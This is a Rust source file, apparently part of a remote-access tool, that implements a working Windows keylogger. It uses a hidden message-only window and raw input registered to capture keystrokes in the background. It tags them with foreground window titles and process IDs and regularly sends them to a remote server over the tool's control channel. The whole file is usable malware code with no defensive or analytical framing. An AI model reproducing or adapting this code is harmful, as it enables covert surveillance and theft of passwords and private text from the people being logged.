use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
use std::sync::Arc;
use std::thread::{self, JoinHandle};

use shared::error::NetworkError;
use shared::packets::{KeyloggerData, Packet};
use windows::Win32::Foundation::{HWND, LPARAM, LRESULT, WPARAM};
use windows::Win32::System::LibraryLoader::GetModuleHandleW;
use windows::Win32::System::Threading::GetCurrentThreadId;
use windows::Win32::UI::Input::KeyboardAndMouse::{
    GetKeyState, GetKeyboardState, MapVirtualKeyW, ToUnicode, MAPVK_VK_TO_VSC, VK_BACK,
    VK_CAPITAL, VK_CONTROL, VK_ESCAPE, VK_NUMLOCK, VK_RETURN, VK_SCROLL, VK_SHIFT, VK_SPACE,
    VK_TAB,
};
use windows::Win32::UI::Input::{
    HRAWINPUT, RAWINPUT, RAWINPUTDEVICE, RAWINPUTHEADER, RIDEV_INPUTSINK, RID_INPUT,
    GetRawInputData, RegisterRawInputDevices,
};
use windows::Win32::UI::WindowsAndMessaging::{
    CreateWindowExW, DefWindowProcW, DestroyWindow, DispatchMessageW, GetForegroundWindow,
    GetMessageW, GetWindowTextW, GetWindowThreadProcessId, HMENU, HWND_MESSAGE, MSG,
    PostThreadMessageW, RegisterClassExW, SetTimer, TranslateMessage, UnregisterClassW, WM_INPUT,
    WM_KEYDOWN, WM_QUIT, WM_TIMER, WNDCLASSEXW, WS_EX_NOACTIVATE,
};
use windows::core::{PCWSTR, w};

use crate::network::MultiplexManager;

const KEYLOG_CLASS_NAME: PCWSTR = w!("KeylogClass");
const KEYLOG_BUFFER_MAX: usize = 4096;
const FLUSH_TIMER_ID: usize = 1;
const FLUSH_INTERVAL_MS: u32 = 500;

/// Shared state accessible from the window procedure callback.
struct KeyloggerState {
    buffer: String,
    last_title: String,
    manager: Arc<MultiplexManager>,
}

// We store the state in a thread-local so the window procedure can access it.
thread_local! {
    static KEYLOGGER_STATE: std::cell::RefCell<Option<KeyloggerState>> = const { std::cell::RefCell::new(None) };
}

pub struct KeyloggerSession {
    stop_flag: Arc<AtomicBool>,
    thread_id: Arc<AtomicU32>,
    join_handle: Option<JoinHandle<()>>,
}

impl KeyloggerSession {
    /// Start a keylogger session. Spawns a thread that captures keystrokes
    /// and sends them to the server via `KeyloggerData` packets.
    ///
    /// # Errors
    /// Returns `NetworkError` if the session cannot be started.
    pub fn start(manager: Arc<MultiplexManager>) -> Result<Self, NetworkError> {
        let stop_flag = Arc::new(AtomicBool::new(false));
        let thread_id = Arc::new(AtomicU32::new(0));

        let stop_clone = stop_flag.clone();
        let tid_clone = thread_id.clone();

        let join_handle = thread::spawn(move || {
            if let Err(e) = run_keylogger(manager, stop_clone, tid_clone) {
                eprintln!("Keylogger error: {e}");
            }
        });

        Ok(Self {
            stop_flag,
            thread_id,
            join_handle: Some(join_handle),
        })
    }

    /// Stop the keylogger session and wait for the thread to finish.
    pub fn stop(&mut self) {
        self.stop_flag.store(true, Ordering::Relaxed);

        let tid = self.thread_id.load(Ordering::Relaxed);
        if tid != 0 {
            unsafe {
                let _ = PostThreadMessageW(tid, WM_QUIT, WPARAM(0), LPARAM(0));
            }
        }

        if let Some(handle) = self.join_handle.take() {
            let _ = handle.join();
        }
    }
}

impl Drop for KeyloggerSession {
    fn drop(&mut self) {
        if self.join_handle.is_some() {
            self.stop();
        }
    }
}

fn run_keylogger(
    manager: Arc<MultiplexManager>,
    stop_flag: Arc<AtomicBool>,
    thread_id: Arc<AtomicU32>,
) -> Result<(), NetworkError> {
    unsafe {
        // Store current thread ID so we can post WM_QUIT from another thread
        thread_id.store(GetCurrentThreadId(), Ordering::Relaxed);

        let hinstance = GetModuleHandleW(None).map_err(|e| {
            NetworkError::IoError(std::io::Error::new(
                std::io::ErrorKind::Other,
                format!("GetModuleHandleW failed: {e}"),
            ))
        })?;

        // Register window class
        let wc = WNDCLASSEXW {
            cbSize: u32::try_from(std::mem::size_of::<WNDCLASSEXW>()).unwrap_or(0),
            lpfnWndProc: Some(wnd_callback),
            hInstance: hinstance.into(),
            lpszClassName: KEYLOG_CLASS_NAME,
            ..Default::default()
        };

        let atom = RegisterClassExW(&wc);
        if atom == 0 {
            return Err(NetworkError::IoError(std::io::Error::new(
                std::io::ErrorKind::Other,
                "RegisterClassExW failed",
            )));
        }

        // Create message-only window
        let hwnd = CreateWindowExW(
            WS_EX_NOACTIVATE,
            KEYLOG_CLASS_NAME,
            None,
            Default::default(),
            0,
            0,
            0,
            0,
            Some(HWND_MESSAGE),
            Some(HMENU::default()),
            Some(hinstance.into()),
            None,
        )
        .map_err(|e| {
            UnregisterClassW(KEYLOG_CLASS_NAME, Some(hinstance.into()));
            NetworkError::IoError(std::io::Error::new(
                std::io::ErrorKind::Other,
                format!("CreateWindowExW failed: {e}"),
            ))
        })?;

        // Register raw input device for keyboard
        let raw_device = RAWINPUTDEVICE {
            usUsagePage: 0x01, // HID_USAGE_PAGE_GENERIC
            usUsage: 0x06,    // HID_USAGE_GENERIC_KEYBOARD
            dwFlags: RIDEV_INPUTSINK,
            hwndTarget: hwnd,
        };

        RegisterRawInputDevices(&[raw_device], u32::try_from(size_of::<RAWINPUTDEVICE>()).unwrap_or(0))
            .map_err(|e| {
                let _ = DestroyWindow(hwnd);
                UnregisterClassW(KEYLOG_CLASS_NAME, Some(hinstance.into()));
                NetworkError::IoError(std::io::Error::new(
                    std::io::ErrorKind::Other,
                    format!("RegisterRawInputDevices failed: {e}"),
                ))
            })?;

        // Set a timer for periodic buffer flushes
        SetTimer(Some(hwnd), FLUSH_TIMER_ID, FLUSH_INTERVAL_MS, None);

        // Initialize thread-local state
        KEYLOGGER_STATE.with(|state| {
            *state.borrow_mut() = Some(KeyloggerState {
                buffer: String::with_capacity(KEYLOG_BUFFER_MAX),
                last_title: String::new(),
                manager,
            });
        });

        // Message loop
        let mut msg = MSG::default();
        loop {
            if stop_flag.load(Ordering::Relaxed) {
                break;
            }

            let ret = GetMessageW(&mut msg, None, 0, 0);
            if !ret.as_bool() {
                // WM_QUIT received or error
                break;
            }

            let _ = TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }

        // Flush remaining buffer
        flush_buffer();

        // Cleanup
        let _ = DestroyWindow(hwnd);
        UnregisterClassW(KEYLOG_CLASS_NAME, Some(hinstance.into()));

        // Clear thread-local state
        KEYLOGGER_STATE.with(|state| {
            *state.borrow_mut() = None;
        });
    }

    Ok(())
}

unsafe extern "system" fn wnd_callback(
    hwnd: HWND,
    msg: u32,
    wparam: WPARAM,
    lparam: LPARAM,
) -> LRESULT {
    match msg {
        WM_INPUT => {
            unsafe { handle_raw_input(lparam) };
            unsafe { DefWindowProcW(hwnd, msg, wparam, lparam) }
        }
        WM_TIMER => {
            if wparam.0 == FLUSH_TIMER_ID {
                flush_buffer();
            }
            LRESULT(0)
        }
        _ => unsafe { DefWindowProcW(hwnd, msg, wparam, lparam) },
    }
}

unsafe fn handle_raw_input(lparam: LPARAM) {
    let hrawinput = HRAWINPUT(lparam.0 as _);

    // Get required buffer size
    let mut size: u32 = 0;
    let header_size = u32::try_from(size_of::<RAWINPUTHEADER>()).unwrap_or(0);
    let _ = unsafe { GetRawInputData(hrawinput, RID_INPUT, None, &mut size, header_size) };

    if size == 0 {
        return;
    }

    // Allocate buffer and read raw input
    let mut buffer = vec![0u8; size as usize];
    let read = unsafe {
        GetRawInputData(
            hrawinput,
            RID_INPUT,
            Some(buffer.as_mut_ptr().cast()),
            &mut size,
            header_size,
        )
    };

    if read == u32::MAX {
        return;
    }

    let raw_input: &RAWINPUT = unsafe { &*buffer.as_ptr().cast() };

    // Only process key down events
    if unsafe { raw_input.data.keyboard.Message } == WM_KEYDOWN {
        let vkey = unsafe { raw_input.data.keyboard.VKey };
        process_key(vkey.into());
    }
}

fn process_key(vkey: u32) {
    KEYLOGGER_STATE.with(|state| {
        let mut state = state.borrow_mut();
        let Some(state) = state.as_mut() else {
            return;
        };

        // Track window title changes
        process_window_title(state);

        // Sync keyboard state for modifier keys
        unsafe {
            GetKeyState(VK_CAPITAL.0.into());
            GetKeyState(VK_SCROLL.0.into());
            GetKeyState(VK_NUMLOCK.0.into());
            GetKeyState(VK_SHIFT.0.into());
        }

        #[allow(clippy::cast_possible_truncation)]
        let vkey_u16 = vkey as u16;

        match vkey_u16 {
            v if v == VK_CONTROL.0 => {
                // CTRL by itself, not worth logging
            }
            v if v == VK_ESCAPE.0 => {
                state.buffer.push_str("[ESCAPE]");
            }
            v if v == VK_RETURN.0 => {
                state.buffer.push_str("[ENTER]");
            }
            v if v == VK_BACK.0 => {
                state.buffer.push_str("[BACKSPACE]");
            }
            v if v == VK_TAB.0 => {
                state.buffer.push_str("[TAB]");
            }
            v if v == VK_SPACE.0 => {
                state.buffer.push(' ');
            }
            _ => {
                // Use ToUnicode to convert virtual key to character
                let mut keyboard_state = [0u8; 256];
                let mut unicode_buf = [0u16; 2];
                unsafe {
                    GetKeyboardState(&mut keyboard_state);
                    let scan_code = MapVirtualKeyW(vkey, MAPVK_VK_TO_VSC);
                    let result = ToUnicode(
                        vkey,
                        scan_code,
                        Some(&keyboard_state),
                        &mut unicode_buf,
                        0,
                    );
                    if result > 0 {
                        #[allow(clippy::cast_sign_loss)]
                        if let Ok(s) = String::from_utf16(&unicode_buf[..result as usize]) {
                            state.buffer.push_str(&s);
                        }
                    }
                }
            }
        }

        // Auto-flush if buffer is getting large
        if state.buffer.len() >= KEYLOG_BUFFER_MAX {
            let data = std::mem::take(&mut state.buffer);
            let packet = KeyloggerData::new(data.into_bytes());
            if let Ok(buf) = packet.serialize() {
                if let Err(e) = state.manager.send_control_packet(&buf) {
                    eprintln!("Failed to send keylogger data: {e}");
                }
            }
        }
    });
}

fn process_window_title(state: &mut KeyloggerState) {
    unsafe {
        let foreground = GetForegroundWindow();
        if foreground == HWND::default() {
            return;
        }

        let mut title_buf = [0u16; 256];
        let len = GetWindowTextW(foreground, &mut title_buf);

        let title = if len > 0 {
            String::from_utf16_lossy(&title_buf[..len as usize])
        } else {
            "(No Title)".to_string()
        };

        if title != state.last_title {
            let mut process_id: u32 = 0;
            GetWindowThreadProcessId(foreground, Some(&mut process_id));

            state
                .buffer
                .push_str(&format!("\n\n[{process_id}] {title}\n"));
            state.last_title = title;
        }
    }
}

fn flush_buffer() {
    KEYLOGGER_STATE.with(|state| {
        let mut state = state.borrow_mut();
        let Some(state) = state.as_mut() else {
            return;
        };

        if state.buffer.is_empty() {
            return;
        }

        let data = std::mem::take(&mut state.buffer);
        let packet = KeyloggerData::new(data.into_bytes());
        if let Ok(buf) = packet.serialize() {
            if let Err(e) = state.manager.send_control_packet(&buf) {
                eprintln!("Failed to flush keylogger data: {e}");
            }
        }
    });
}
